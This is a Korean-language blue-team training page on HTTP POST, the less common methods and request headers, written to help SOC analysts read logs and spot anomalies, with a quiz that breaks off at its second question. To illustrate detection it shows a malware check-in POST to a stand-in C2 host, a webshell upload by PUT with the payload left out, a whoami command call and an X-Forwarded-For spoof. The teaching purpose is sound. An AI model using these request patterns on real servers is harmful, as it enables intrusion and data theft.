---
title: "POST, 그 밖의 메서드, 요청 헤더"
tags:
  - training
  - blue-team
  - http
  - concept
---

# POST, 그 밖의 메서드, 요청 헤더 { #post-methods-headers }

!!! abstract "이 페이지에서 다루는 것"
    POST가 무엇이고 왜 본문이 로그에 안 남는지, 그래서 악성코드와 웹셸이 왜 POST를 좋아하는지. CONNECT·HEAD·OPTIONS·PUT·DELETE·TRACE 여섯 메서드와 각각의 공격 활용. 요청 헤더(Host, User-Agent, Referer, Cookie, Accept, X-Forwarded-For)를 읽고 이상한 요청을 골라내는 법. 마지막에 확인 문제와 해설(자주 하는 실수 포함)이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 앞 내용은 [웹 서버, URL, GET 요청](web-servers-urls-get.md)에 있습니다.

## 한눈에 보는 핵심 10가지 { #key-points }

1. GET이 "이거 주세요"라면 POST는 "이거 받아 주세요". 정보를 주소가 아니라 **본문(택배 상자 안)**에 담는다.
2. 웹 서버·프록시 로그는 보통 본문을 기록하지 않는다. 하지만 **로그에 없다 ≠ 아무도 못 본다**. `http`면 풀 패킷 캡처에 다 보인다.
3. 악성코드와 똑똑한 웹셸은 POST를 쓴다. Referer 없음 + 앞선 GET 없음 + Base64 본문 + 일정한 주기 = 비콘.
4. CONNECT는 프록시에 "통로를 뚫어 달라"는 요청이다. TLS 검사가 없으면 https 접속은 프록시 로그에 CONNECT 한 줄로만 남는다.
5. HEAD·OPTIONS는 정찰에 쓰인다. 외부 IP의 HEAD 404 수백 개 중 200 몇 개 = 그 파일부터 확인.
6. 외부에서 온 PUT에 `201`/`2xx` + 실행 파일(`.jsp`, `.aspx`, `.php`) = 웹셸 업로드 최우선 확인.
7. 표준에 없는 메서드 이름이 보이면 그 자체가 강한 이상 신호다.
8. Host를 봐야 어느 사이트인지 안다(가상 호스팅). User-Agent와 X-Forwarded-For는 **누구나 거짓으로 쓸 수 있는 값**이다.
9. 쿠키는 로그인 손목밴드다. 훔치면 비밀번호와 MFA 없이 들어온다. 같은 세션이 다른 나라·다른 기기에서 쓰이면 의심.
10. 헤더 하나보다 **패턴**(주기, 순서, 앞뒤 요청, 헤더 순서 지문)을 본다.

## POST = "이거 받아 주세요" { #post }

**왜 필요한가.** GET은 정보를 주소에 적습니다. 엽서 주소 칸에 내용을 끼워 쓰는 셈이라 짧은 것만 가능하고, 누구나 보며, 로그에 그대로 적힙니다. 로그인 정보, 긴 글, 파일처럼 길거나 민감한 걸 보낼 때는 **택배 상자**가 필요합니다. 주소(URL)는 겉면에 짧게, 내용물은 상자 안(본문, Body)에 넣는 것이 POST입니다. POST는 GET 다음으로 중요한 메서드입니다.

### 실제 모양 { #post-request }

로그인 화면에서 "로그인"을 누르면 브라우저는 이런 요청을 보냅니다.

```
POST /login.php HTTP/1.1
Host: app.corp.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/141.0.0.0 Safari/537.36
Referer: https://app.corp.local/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=jsmith&password=Winter2026%21
```

1. `POST /login.php HTTP/1.1` — "`/login.php`에 뭔가 보낼게요". **주소에 `?`도 파라미터도 없음**
2. `Host` — 어느 사이트인지
3. `User-Agent` — 크롬이라는 자기소개
4. `Referer: https://app.corp.local/login.php` — "로그인 화면을 보다가 보냈어요". 사람이 화면을 열고 → 입력하고 → 버튼을 누른 자연스러운 흐름(아래 악성코드 예시와 비교)
5. `Content-Type: application/x-www-form-urlencoded` — 상자 내용물의 포장 방식. "입력 칸(Form) 값을 `이름=값&이름=값`으로 담았어요"
6. `Content-Length: 38` — 내용물이 38바이트. 마지막 줄 글자 수가 정확히 38
7. 빈 줄 — "겉면 메모 끝, 이제 내용물"
8. `username=jsmith&password=Winter2026%21` — **본문**. 규칙은 GET 파라미터와 같고 `%21` = `!`

### 로그에는 어떻게 남나 { #post-logging }

같은 로그인을 GET으로 했을 때는 비밀번호가 로그에 찍혔습니다([GET 로그 예시](web-servers-urls-get.md#get-logging)). POST로 바꾸면:

```
10.1.5.23 - - [28/Oct/2026:20:15:02 +1100] "POST /login.php HTTP/1.1" 302 215 "https://app.corp.local/login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ..."
```

요청 줄에 `POST /login.php`까지만 있고 **비밀번호가 없습니다.** 웹 서버와 프록시는 보통 요청 첫 줄과 일부 헤더만 기록하고 본문은 기록하지 않습니다.

!!! warning "[주의] 로그에 안 남는다 ≠ 아무도 못 본다"
    `http`(엽서)로 갔다면 풀 패킷 캡처(Full PCAP)에는 상자 안 내용까지 찍힙니다. WAF나 일부 EDR도 본문을 볼 수 있습니다. POST는 "웹 로그에 덜 남는다"일 뿐 암호화(`https`)를 대신하지 않습니다.

### 공격자도 POST를 좋아한다 { #post-abuse }

방어자에게 편한 성질은 공격자에게도 편합니다. 악성코드는 탐지를 피하려고 POST를 쓰고, 본문을 인코딩·암호화해서 발견돼도 무슨 일인지 알기 어렵게 만듭니다. 사람이 읽을 수 있어야 할 본문이 굳이 포장돼 있다면 **"왜?"**라고 물어야 합니다.

**장면 1: 악성코드의 POST 보고(체크인).**

```
POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
```

| 단서 | 왜 수상한가 |
| --- | --- |
| `/gate.php` | 봇넷(감염 PC 무리) 관리 서버 주소로 자주 쓰이던 이름. 이름만으로 단정은 금물 |
| Referer 없음 | 사람이 화면을 보다 누른 게 아니라 프로그램이 다짜고짜 보냄. 직전에 그 사이트 페이지를 GET한 기록도 없을 것 |
| `MSIE 8.0` + `Windows NT 6.1` | 인터넷 익스플로러 8 + 윈도우 7. 2026년 회사 PC에 있을 수 없는 조합 |
| `data=` 뒤 알 수 없는 글자 | Base64 포장. 풀면 `host=admin-PC1&os=Win11&user=jsmith` — 감염 PC의 신상 보고 |
| 일정한 주기로 반복 | 비콘(Beacon) |

실제 악성코드는 Base64 위에 암호화까지 덧씌우는 경우가 많아 풀어도 의미 없는 글자만 나올 수 있습니다. 그래도 "정상 Base64로 풀린다"는 사실 자체가 단서입니다.

**장면 2: 똑똑한 웹셸은 POST를 쓴다.** 명령을 GET 파라미터로 받는 웹셸은 IIS 로그에 명령이 찍힙니다(`c=ipconfig+/all`). 신경 쓰는 공격자는 명령을 POST 본문에 넣습니다. 그러면 IIS 로그에는 이것만 남습니다.

```
2026-10-28 09:42:11 10.20.1.15 POST /uploads/avatar.aspx - 443 - 185.220.101.4 Mozilla/5.0 200 0 0 298
```

파라미터 칸이 `-`(비어 있음)라 웹 로그로는 무슨 명령인지 모릅니다. 대응은 두 가지입니다.

- 호스트 쪽 이벤트 4688·Sysmon 1에서 `w3wp.exe` → `cmd.exe`와 명령줄 확인([웹셸 탐지](web-servers-urls-get.md#web-servers))
- "그림 폴더의 파일에 POST가 계속 오고 매번 200"이라는 패턴 자체를 의심. 정상 이미지 파일에는 POST할 이유가 없음

**[보충] 큰 POST는 유출 신호.** POST 상자는 크기 제한이 사실상 없어(서버 설정에 따름) 데이터 유출에도 쓰입니다. `Content-Length`가 수백 MB인 POST가 처음 보는 외부 사이트로 나가면 확인 대상입니다. 파일 업로드는 보통 `Content-Type: multipart/form-data`(상자 안에 칸막이를 치고 칸마다 파일이나 값을 하나씩 담는 포장)를 씁니다.

## 그 밖의 메서드 여섯 가지 { #other-methods }

GET·POST 외에 HTTP/1.1이 정한 메서드가 여섯 개 더 있습니다. 평소엔 드물지만 **우리 웹 서버로 들어오는 공격**을 조사할 때 등장합니다. 표준을 지키는 서버라도 **GET과 HEAD만 필수**이고 나머지는 선택입니다.

| 메서드 | 한 줄 뜻 | 공격·조사 포인트 |
| --- | --- | --- |
| CONNECT | 프록시에 "통로 뚫어 주세요" | https는 CONNECT 한 줄로만 남음. 443 외 포트로의 CONNECT = 우회 시도 |
| HEAD | "겉포장 정보만 주세요" | 스캐너의 파일 존재 확인 정찰 |
| OPTIONS | "어떤 방식 쓸 수 있나요?" | 공격 전 정찰. 단 CORS 사전 요청으로 정상 트래픽에도 많음 |
| PUT | "이 자리에 파일 올려 주세요" | 웹셸 업로드. 외부 PUT + 2xx = 최우선 확인 |
| DELETE | "이 파일 지워 주세요" | 흔적 삭제 가능성 |
| TRACE | "제가 보낸 걸 그대로 읽어 주세요" | 옛 XST 공격. 지금은 사실상 막힘, 꺼 두는 게 원칙 |

### CONNECT — 프록시에게 "터널을 뚫어 주세요" { #connect }

회사 PC는 인터넷에 직접 나가지 않고 **프록시**(Proxy, 출입문 경비실 같은 중간 대리인)를 거치는 경우가 많습니다. `https`는 암호화 대화라서 PC는 경비실에 "구글과 비밀 통로를 연결해 주세요"라고 먼저 부탁해야 합니다. 그게 CONNECT입니다.

```
CONNECT www.google.com:443 HTTP/1.1
Host: www.google.com:443

HTTP/1.1 200 Connection established
```

- 1줄: "구글의 443번 문까지 통로를 연결해 주세요". 경로 대신 `호스트:포트`
- 마지막 줄: **프록시**의 대답 "통로 연결됐습니다". 그다음 오가는 내용은 전부 암호화되어 프록시도 못 봄(TLS 검사를 하지 않는다면)

**SOC 포인트.** TLS 검사가 없는 회사의 프록시 로그에서 https 접속은 거의 다 CONNECT 한 줄로만 남습니다. "누가, 언제, 어느 도메인의 몇 번 포트로 통로를 뚫었는지"는 알지만, 어떤 페이지를 봤는지·무엇을 내려받았는지는 모릅니다. 또 CONNECT는 원래 443(https)용입니다. `CONNECT 198.51.100.7:22`(SSH)나 `:25`(메일) 같은 기록은 프록시를 우회 통로로 쓰려는 시도일 수 있습니다.

### HEAD — "내용물 말고 겉포장 정보만" { #head }

GET과 똑같은 응답을 받되 **본문만 빼고 헤더만** 받습니다. 원래 용도는 "파일이 바뀌었나?"를 확인해 안 바뀌었으면 저장해 둔 사본(캐시, Cache)을 쓰려는 것입니다. 마트에 전화해 "그 상품 들어왔어요?"만 묻는 것과 같습니다.

```
HEAD /files/report.pdf HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Content-Type: application/pdf
Content-Length: 482113
Last-Modified: Mon, 26 Oct 2026 03:10:00 GMT
```

파일 종류(PDF), 크기(482,113바이트), 마지막 수정 시각만 있고 본문은 없습니다.

**[보충] 정찰 도구로서의 HEAD.** 자동 스캐너는 `/backup.zip`, `/db.sql`, `/.git/config` 같은 "실수로 남겨 뒀을 법한 파일"이 있는지 HEAD로 빠르게 두드려 봅니다. 같은 외부 IP에서 HEAD가 수백 개 오고 대부분 `404`(없음)인데 몇 개만 `200`(있음)이면, **그 200이 난 파일**을 반드시 확인합니다.

### OPTIONS — "여기서 어떤 방식을 쓸 수 있나요?" { #options }

```
OPTIONS / HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Allow: GET, POST, HEAD, OPTIONS, PUT, DELETE
```

`Allow` 줄이 대답입니다. 이 서버는 PUT·DELETE까지 받는다고 말합니다. 해커에겐 "파일을 올려 볼 수 있겠네"라는 힌트라 OPTIONS는 정찰 단계에서 자주 보입니다.

**[변경됨] 정상 OPTIONS도 아주 많습니다.** 웹 페이지가 **다른 도메인의 API**에 요청할 때 브라우저가 진짜 요청 전에 OPTIONS로 "보내도 돼요?"라고 먼저 묻습니다(CORS 사전 요청, CORS Preflight). "OPTIONS = 수상"이 아니라 **외부 IP가 여러 경로에 OPTIONS를 마구 보내는지**를 봅니다.

### PUT — "이 파일을 이 자리에 올려 주세요" { #put }

여섯 개 중 공격과 가장 관련이 깊습니다. [레시피 폴더 원리](web-servers-urls-get.md#web-servers) 때문에, 서버가 PUT을 잘못 허용하면 해커는 업로드 화면의 허점을 찾을 필요도 없습니다.

```
PUT /shell.jsp HTTP/1.1
Host: www.example.com
Content-Length: 412

<% ... malicious code that runs commands ... %>
```

"`/shell.jsp` 자리에 이 내용물을 놓아 주세요". 서버가 `201 Created`(새로 만들었음)나 `200`/`204`로 답하면 웹셸이 심어진 것이고, 다음엔 `GET /shell.jsp?cmd=whoami`로 부르기만 하면 됩니다. Java 웹 서버 Apache Tomcat에서 PUT 관련 취약점으로 웹셸이나 악성 파일을 올리는 사건이 여러 번 있었습니다(2017년 CVE-2017-12617, 2025년 3월 CVE-2025-24813). **외부에서 들어온 PUT + `201`/`2xx`는 최우선 확인 대상**입니다.

### DELETE — "이 파일을 지워 주세요" { #delete }

지정한 경로의 파일(자원)을 지우라는 요청입니다. 보안 사건에서 자주 보이진 않지만, 공격자가 자기가 올린 파일을 지워 흔적을 없앨 때 쓸 수 있습니다. 외부에서 온 DELETE 성공 기록이 있으면 무엇을 지웠는지 확인합니다.

**[변경됨] PUT·DELETE·PATCH는 정상 API에서 흔합니다.** REST API는 "읽기 GET, 만들기 POST, 고치기 PUT·PATCH(일부만 고치기), 지우기 DELETE"로 역할을 나눕니다. 따라서 메서드 자체보다 **그 앱이 원래 그 방식을 쓰는지, 경로가 API 경로인지 웹 폴더의 실행 파일(`.jsp`, `.aspx`, `.php`)인지**를 봅니다.

### TRACE — "제가 보낸 걸 그대로 다시 읽어 주세요" { #trace }

서버가 받은 요청을 그대로 본문에 담아 되돌려 주는 메아리 기능(애플리케이션 계층 루프백)입니다. 원래는 중간 프록시를 거치며 요청이 어떻게 바뀌었는지 보는 점검용입니다.

**[보충] XST(Cross-Site Tracing).** 브라우저 쿠키는 웹 페이지 스크립트가 못 읽게 보호할 수 있는데, 예전엔 TRACE로 쿠키가 든 요청을 메아리치게 해서 그 보호를 우회했습니다. 지금 브라우저는 웹 페이지 스크립트가 TRACE를 못 보내게 막아서 이 공격은 사실상 사라졌습니다. 그래도 보안 점검 도구는 "TRACE 켜져 있음"을 경고하고, 필요 없는 기능이니 꺼 두는 것이 원칙입니다.

### 악성코드는 규칙을 안 지킨다 { #nonstandard-methods }

메서드 이름은 **정상 브라우저가 정상 서버와 대화할 때만** 의미가 있습니다. 감염 PC의 악성코드와 해커 서버는 둘 다 해커가 만든 프로그램이라 `BEACON /`이나 `GETT /` 같은 표준에 없는 이름을 써도 서로 알아듣습니다. 거꾸로 **로그에 표준 목록에 없는 메서드가 보이면 그 자체가 강한 이상 신호**입니다.

## 요청 헤더 읽기 { #headers }

헤더는 요청 첫 줄 아래 붙는 `이름: 값` 메모들입니다. 택배 상자 겉면의 송장이라고 생각하면 됩니다. 내용물이 암호화·포장돼 있어도 송장은 비교적 읽기 쉬워서 분석가에게 가장 쓸모 있는 단서입니다.

| 헤더 | 한 줄 뜻 |
| --- | --- |
| Host | 어느 도메인(사이트)에 왔는지 — **가장 중요** |
| User-Agent | 요청한 프로그램의 자기소개 |
| Referer | 직전에 있던 페이지(철자가 틀린 채로 표준이 됨) |
| Cookie | 이전 방문에서 받은 손님 식별 정보 |
| Accept* | 받을 수 있는 파일 종류·언어·압축 방식 |
| X-Forwarded-For | 프록시·로드밸런서가 붙이는 "원래 보낸 사람" 메모 |

예시 요청 — 사용자가 구글 검색 결과에서 쇼핑몰 링크를 눌렀을 때:

```
GET /products/shoes?id=1032 HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Referer: https://www.google.com/
Cookie: session_id=8f3a91c2e7b44d0e; cart=2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-AU,en;q=0.9,ko;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### 점검 질문 네 가지 { #header-checklist }

HTTP 요청 하나를 볼 때 칸마다 이렇게 묻습니다.

1. **Host** — 안전해 보이는 도메인인가? ([DNS 도메인 신호](../dns/domain-signals.md)의 판단법 적용)
2. **User-Agent**(요청) / **Server**(응답) — 아는 프로그램인가? 우리 네트워크에서 흔한가? 우리가 실제로 쓰는 프로그램이고, 운영체제·버전이 맞는가?
3. **경로** — 폴더·파일 이름과 GET 파라미터가 무작위, 피싱 같은 이름, 인코딩 등으로 수상하지 않은가?
4. **내용** — 필요 없는 인코딩 같은 이상한 점은 없는가? 길고 무작위이거나 굳이 인코딩된 곳은 모두 의심 대상

### Host — "어느 가구를 찾아왔는지" { #host }

IP는 아파트 동 번호이고 한 동에 수백 가구(사이트)가 삽니다. 서버는 Host를 보고 "`shop.example.com` 손님이구나" 하고 그 사이트 파일을 내줍니다. 이를 **가상 호스팅**(Virtual Hosting)이라고 합니다. 분석가도 **IP만으로는 어느 사이트에 갔는지 모르고 Host를 봐야 압니다.** Zeek가 `host` 필드를 따로 저장하는 이유입니다.

**[보충] 도메인 프론팅(Domain Fronting).** https에는 봉투 겉면 이름(SNI)과 봉투 속 Host가 따로 있습니다. 공격자는 겉면에 믿을 만한 유명 사이트를, 속 Host에 자기 C2 사이트를 적습니다. 방화벽은 겉면만 보고 통과시키고, 같은 CDN의 해커 사이트로 편지가 전달됩니다. 주요 CDN 다수가 이 수법을 막았지만, TLS 검사가 가능한 환경이라면 **SNI와 Host가 다른 요청**은 확인할 가치가 있습니다.

### User-Agent — "요청한 프로그램의 자기소개" { #user-agent }

```
Mozilla/5.0                       ← historical prefix (almost every browser says this)
(Windows NT 10.0; Win64; x64)     ← OS: Windows, 64-bit
AppleWebKit/537.36 (KHTML, like Gecko)  ← rendering engine family
Chrome/141.0.0.0                  ← actual browser and version
Safari/537.36                     ← compatibility tag
```

크롬인데 `Mozilla`, `Safari`, `Gecko`가 다 들어 있는 건, 옛 웹사이트들이 특정 브라우저만 우대하자 새 브라우저들이 "저도 그거예요"라고 이름을 덧붙인 역사의 흔적입니다. 실제 정체는 `Chrome/141`입니다.

수상한 User-Agent 예:

```
python-requests/2.32.3
curl/8.9.1
Go-http-client/1.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Mozila/5.0 (Windows NT 10.0; Win64; x64)
(empty)
```

- 1~3줄: 파이썬 프로그램, `curl` 명령, Go 언어 프로그램의 기본 자기소개. 개발자·관리 스크립트면 정상일 수 있지만 일반 사무 PC에서 외부로 나가면 확인
- 4줄: 2026년에 있을 수 없는 낡은 브라우저(IE8 + 윈도우 7)
- 5줄: `Mozilla`를 `Mozila`로 **틀리게 씀** — 손으로 흉내 내다 낸 오타
- 6줄: 비어 있음. 정상 브라우저는 절대 비우지 않음

!!! warning "[주의] User-Agent는 신분증이 아니라 자기소개"
    누구나 아무 값이나 쓸 수 있습니다. 실력 있는 공격자는 완벽한 최신 크롬을 흉내 냅니다. 이상하면 의심의 근거지만, 정상이라고 안심의 근거는 아닙니다.

**[변경됨] User-Agent 축소(User-Agent Reduction).** 요즘 크롬은 사생활 보호 때문에 **윈도우 11에서도 `Windows NT 10.0`**으로 표시하고 세부 버전을 `0.0.0`으로 고정합니다. User-Agent만으로는 윈도우 10/11을 구분할 수 없습니다. 자세한 정보는 `Sec-CH-UA`로 시작하는 Client Hints 헤더로 필요할 때만 보냅니다.

### Referer — "어디서 왔는지 적힌 소개장" { #referer }

직전에 있던 페이지 주소입니다. 예시의 `Referer: https://www.google.com/`은 "구글 검색 결과에서 눌러서 왔어요"입니다. 철자가 `Referrer`가 아니라 `Referer`인 건 1990년대 표준 문서의 오타가 굳은 것입니다. 나중에 생긴 설정 헤더 `Referrer-Policy`는 올바른 철자라서 **로그 검색 때 철자를 헷갈리면 결과가 안 나옵니다.**

Referer는 사용자가 **어떤 길로 악성 사이트에 도착했는지** 되짚는 발자국입니다.

```
1) GET https://outlook.office.com/mail/...                      Referer: (none)
2) GET http://q8z3k1vt.shady-host.eu/38104p5h2c                 Referer: https://outlook.office.com/
3) GET http://q8z3k1vt.shady-host.eu/PVfXBbR9WReNMmb...         Referer: http://q8z3k1vt.shady-host.eu/38104p5h2c
```

1. 웹메일을 염
2. 메일 속 링크를 눌러 수상한 사이트로 감(Referer = 웹메일)
3. 그 사이트가 다음 페이지(악성 파일)로 넘김(Referer = 2번 페이지)

→ "피싱 메일 → 링크 클릭 → 악성 다운로드"를 증명할 수 있습니다. 의미 없는 글자 조합 서브도메인과 긴 무작위 경로는 익스플로잇 킷(Exploit Kit)의 전형적인 모양입니다. Referer가 구글 검색이라면 악성 사이트를 검색 결과 위로 올리는 **SEO 포이즈닝**(SEO Poisoning)을 의심합니다.

Referer는 항상 있지 않습니다. 주소창 직접 입력이나 즐겨찾기로 열면 없습니다. 요즘 브라우저는 다른 사이트로 넘어갈 때 경로를 잘라 도메인만 보내므로 2번처럼 `https://outlook.office.com/`까지만 보이는 게 정상입니다.

### Cookie — "놀이공원 손목밴드" { #cookie }

HTTP는 원래 기억력이 없어 요청마다 처음 보는 손님입니다. 놀이공원 입구에서 표를 확인하고(로그인) **손목밴드**를 채워 주면(응답의 `Set-Cookie`) 그다음부터 놀이기구마다 밴드만 보여 주면(요청의 `Cookie`) 됩니다.

예시의 `Cookie: session_id=8f3a91c2e7b44d0e; cart=2` = 쿠키 두 개(`;`로 구분). `session_id`는 로그인 밴드 번호, `cart=2`는 장바구니 2개라는 메모입니다.

**손목밴드를 훔치면 표 검사를 건너뜁니다.** 로그인 쿠키를 훔친 공격자는 비밀번호도 MFA도 없이 그 사람으로 들어옵니다(세션 하이재킹, Session Hijacking). **[2026 현재]** 정보 탈취형 악성코드(Infostealer)가 브라우저 쿠키를 통째로 훔쳐 팔고, AiTM(Adversary-in-the-Middle) 피싱이 가짜 로그인 페이지에서 진짜 로그인을 대신 해 주며 쿠키를 가로챕니다. "MFA를 켰는데 뚫렸다"는 사건의 상당수가 이것입니다. **같은 세션 쿠키가 갑자기 다른 나라 IP나 다른 User-Agent에서 쓰이는** 패턴이 핵심 탐지 포인트입니다.

**악성코드가 쿠키에 정보를 숨깁니다.** 쿠키는 원래 길고 무작위처럼 보여 판단이 어렵고, 공격자는 그 점을 노립니다. 해킹 도구 Cobalt Strike는 기본 설정에서 감염 PC 정보를 Base64로 포장해 Cookie 헤더에 싣습니다. 이름 없이 긴 Base64 덩어리 하나만 있거나, 처음 보는 도메인으로 가는 요청마다 쿠키가 바뀌면 의심해 볼 만합니다.

### Accept 가족 — "이런 형태로 주세요" { #accept }

`Accept`(파일 종류), `Accept-Language`(언어), `Accept-Encoding`(압축 방식)을 묶어 `Accept*`라고 부릅니다.

`Accept-Language: en-AU,en;q=0.9,ko;q=0.8` → 호주 영어, 일반 영어(선호도 0.9), 한국어(0.8). `q`는 선호 점수로 1이 최고이고, 안 쓰면 1입니다.

**[정정]** "여러 개면 처음 적힌 게 선호"라고 설명되곤 하지만, 정확히는 **순서가 아니라 `q` 점수**가 선호도를 정합니다. 브라우저가 점수 순서로 적어서 결과가 같아 보일 뿐입니다.

쓸모 두 가지:

- 우리 서버로 들어온 공격 요청의 `Accept-Language`가 도구 기본값이거나 아예 없으면 사람이 아닌 자동 도구라는 단서
- `Accept-Encoding: gzip`이면 응답이 **압축되어** 옴. 패킷 캡처에서 파일을 직접 꺼낼 때 압축을 풀어야 원래 파일이 나옴(대부분 도구는 자동으로 풀어 줌)

### X-Forwarded-For — "원래 보낸 사람" 메모 { #x-forwarded-for }

요청이 프록시나 로드밸런서(Load Balancer, 손님을 여러 서버에 나눠 주는 안내 데스크)를 거치면 서버에는 접속 IP가 전부 **대리인 IP**로 보입니다. 대리인이 "원래 손님은 이 IP였어요"라고 붙이는 메모가 `X-Forwarded-For`(XFF)입니다.

```
Web server log -> client IP: 10.0.0.5          (our load balancer)
Request header -> X-Forwarded-For: 203.0.113.77 (the real visitor)
```

이걸 모르면 "공격자 IP가 우리 내부 장비네?"라고 엉뚱한 결론을 냅니다. 이 메모는 대리인을 **통과한 뒤**에만 붙어서, 사용자 PC 쪽 캡처에는 없고 대리인 바깥쪽(서버 쪽)에서만 보입니다.

!!! warning "[주의] XFF는 손님이 거짓으로 쓸 수 있다"
    공격자가 `X-Forwarded-For: 127.0.0.1`(서버 자기 자신)을 써 보내면 허술한 앱은 "내부 요청이네" 하고 관리자 기능을 열어 줄 수 있습니다. 대리인은 이미 적힌 값 **뒤에** 진짜 IP를 덧붙이므로, 믿을 수 있는 건 **우리 대리인이 마지막에 붙인 값(보통 맨 오른쪽)**입니다.

### 헤더 순서와 용어 { #header-order }

헤더 순서는 자유이고, 순서가 바뀌어도 서버 응답은 같아야 합니다.

**[보충] 순서가 지문이 됩니다.** 크롬·파이어폭스·엣지는 **각자 늘 같은 순서**로 헤더를 씁니다. 악성코드가 크롬 User-Agent를 흉내 내도 헤더 순서·구성까지 맞추지 못하는 경우가 많습니다. "User-Agent는 크롬인데 헤더 순서는 크롬이 아니네?"를 잡는 지문 기법이 있고, JA4H(HTTP 클라이언트 지문)가 그 예입니다. 이름은 속여도 말버릇은 못 속이는 것과 같습니다.

**[변경됨] "엔티티 헤더"라는 말은 사라졌습니다.** 예전 자료는 헤더를 내용물을 설명하는 **엔티티 헤더**(`Content-Type`, `Content-Length`)와 내용물과 무관한 **요청 헤더**(`Cookie`, `User-Agent`, `Referer`)로 나눴습니다. 개념은 여전히 쓸모 있지만, 2022년 6월 HTTP 표준 재정리(RFC 9110) 이후 공식 용어는 "Representation"/"Content" 헤더입니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 그대로 유효한 것"
    GET과 POST의 차이, POST 본문이 웹 로그에 안 남는다는 점, 악성코드의 POST + Base64, 헤더로 이상 요청을 골라내는 [점검 질문 네 가지](#header-checklist)는 지금도 그대로 좋은 기본 습관입니다.

!!! info "[변경됨] 바뀐 것"
    - **쿠키가 비밀번호보다 중요한 표적.** MFA가 보편화되며 공격자는 로그인이 끝난 쿠키(세션)를 훔칩니다(Infostealer, AiTM). "같은 세션이 다른 장소·기기에서 쓰이는 것"을 감시합니다.
    - **User-Agent 정보량 감소.** User-Agent Reduction으로 윈도우 10/11과 세부 버전 구분 불가. Client Hints(`Sec-CH-UA`)로 이동.
    - **정상 트래픽의 모습 변화.** OPTIONS(CORS 사전 요청), PUT, PATCH, DELETE가 REST API에서 일상적. 앱별 기준선이 중요해졌습니다.
    - **용어 변화.** RFC 9110 이후 "엔티티 헤더"는 공식 용어가 아님.
    - **PUT 관련 취약점은 최근에도 나옴.** 2025년 3월 Apache Tomcat CVE-2025-24813은 특정 설정에서 PUT으로 원격 코드 실행까지 이어질 수 있었고, 공개 직후 실제 공격 시도가 보고됐습니다.

!!! warning "[주의] / [정정]"
    - **[정정] "HTTP/2·HTTP/3에서는 메서드가 크게 다르다"는 오해입니다.** 메서드 이름과 의미는 그대로입니다. 바뀐 건 전달 방식으로, 글자로 쓰던 첫 줄과 `Host`가 `:method`, `:path`, `:authority` 같은 특수 칸(Pseudo-header)으로 바뀌고 전체가 이진 형식으로 압축됩니다. 도구가 해석해서 보여 주면 똑같이 읽으면 됩니다. CONNECT만 웹소켓·UDP 터널용 확장 변형이 생겼습니다.
    - **"POST라서 로그에 없다"로 조사를 끝내지 않습니다.** 호스트 로그(4688, Sysmon), WAF, 풀 패킷 캡처를 찾습니다.
    - **XFF와 User-Agent는 공격자가 마음대로 쓰는 값.** 우리 장비가 직접 붙인 값인지 확인합니다.
    - **TRACE 켜짐을 큰 사고로 보지 않습니다.** 끄는 게 맞지만 PUT 허용이나 웹셸 흔적보다 우선순위가 훨씬 낮습니다.

## 확인 문제 { #quiz }

먼저 직접 답해 본 뒤 해설을 펼쳐 보세요. 해설에는 실제로 자주 나오는 오답도 정리했습니다.

### 문제 1

TLS 검사를 하지 않는 회사의 프록시 로그에 이 줄이 있습니다.

```
2026-10-28 09:12:44 10.1.5.23 CONNECT secure-login.example-bank.com.verify-id.net:443 200
```

(a) 이 로그만으로 알 수 있는 것과 알 수 없는 것은? (b) 이 도메인의 진짜 주인은 누구이고 왜 의심스럽습니까?

??? success "정답과 해설"
    **(b) 진짜 주인은 `verify-id.net`.** `.net`이 최상위 도메인(TLD), `verify-id`가 2단계 도메인(Second-Level Domain)이고, 둘을 합친 `verify-id.net`이 등록된 부모 도메인입니다. 앞의 `secure-login.example-bank.com`은 `.com`까지 들어 있어 은행 주소처럼 보이지만 전부 서브도메인입니다. 은행을 사칭하는 전형적인 피싱 도메인입니다.

    **(a)** 

    - **알 수 있는 것:** 누가(`10.1.5.23`), 언제(09:12:44), 어느 도메인의 몇 번 문(443, https)으로 통로를 요청했는지, 그리고 **프록시가 막지 않고 통과시켰다**는 사실. 차단되지 않았으니 사용자가 실제로 사이트에 닿았을 가능성이 높습니다.
    - **알 수 없는 것:** 어떤 페이지를 봤는지, 아이디·비밀번호를 입력했는지(POST 여부), 무엇을 내려받았는지, 사이트가 준 응답 코드. 전부 암호화된 통로 안의 일입니다.

    **자주 하는 실수: "TLS가 연결됐고 200으로 승인됐다."** 이 `200`은 **프록시**가 "통로를 뚫어 드렸습니다(Connection established)"라고 한 대답입니다. 경비실이 "출입문 열어 드렸어요"라고 한 것이지 건물 안에서 일이 잘 됐다는 뜻이 아닙니다. TLS 핸드셰이크는 이 `200` **다음에** 통로 안에서 시작되므로, 이 로그만으로는 TLS 성공 여부도 사이트의 응답도 알 수 없습니다. 로그의 각 값이 **누가 한 말인지**(프록시인지 목적지 서버인지) 구분하는 습관이 중요합니다.

    **다음 행동:** 사용자가 비밀번호를 입력했다고 최악을 가정 → 사용자 확인, 필요 시 비밀번호 변경·세션(쿠키) 종료 → 프록시·DNS 로그에서 같은 도메인에 접속한 다른 직원 찾기 → 도메인 차단.

### 문제 2

